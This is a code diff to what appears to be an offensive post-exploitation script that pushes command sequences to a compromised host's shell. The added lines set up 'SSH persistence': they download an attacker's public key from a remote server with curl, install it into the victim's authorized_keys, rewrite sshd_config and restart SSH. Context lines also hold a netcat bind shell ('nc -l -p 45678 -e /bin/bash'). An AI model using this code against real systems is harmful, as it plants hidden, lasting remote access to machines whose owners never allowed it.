@@ -448,6 +448,10 @@ if __name__ == "__main__":
         com_and_cont=True,
         auto_mode=False,
     )
+    LOG("Begin setup for SSH persistence", logfile, "log")
+    print("[~] Begin setup for SSH persistence")
+    subprocess.run("./makesshkeys.sh", shell=True)
+    print("[V] SSH setup done")
     LOG("Begin sending sequences", logfile, "log")
     sequence = [
         "whoami",
@@ -470,8 +474,21 @@ if __name__ == "__main__":
         "echo pwnguined",
         "nc -l -p 45678 -e /bin/bash",
     ]
-    sendCommands(shell, sequence)
-    sendCommands(shell, sequence2)
+    sequence3 = [
+        "whoami",
+        "curl -s " + srv + "/post/id_rsa.pub -o id_rsa.pub > /dev/null",
+        "mkdir ~/.ssh",
+        "touch ~/.ssh/authorized_keys",
+        "chmod 700 ~/.ssh",
+        "cat id_rsa.pub > ~/.ssh/authorized_keys",
+        "chmod 600 ~/.ssh/authorized_keys",
+        "rm id_rsa.pub",
+        "echo 'PubkeyAuthentication yes' | cat - /etc/ssh/sshd_config > temp && mv temp /etc/ssh/sshd_config",
+        "/etc/init.d/ssh restart",
+        "echo get persisted kid",
+    ]
+    #sendCommands(shell, sequence)
+    sendCommands(shell, sequence3)
     LOG("Sequences sent", logfile, "log")
     LOG("END OF LOGS", logfile, "crit")
     logfile.close()
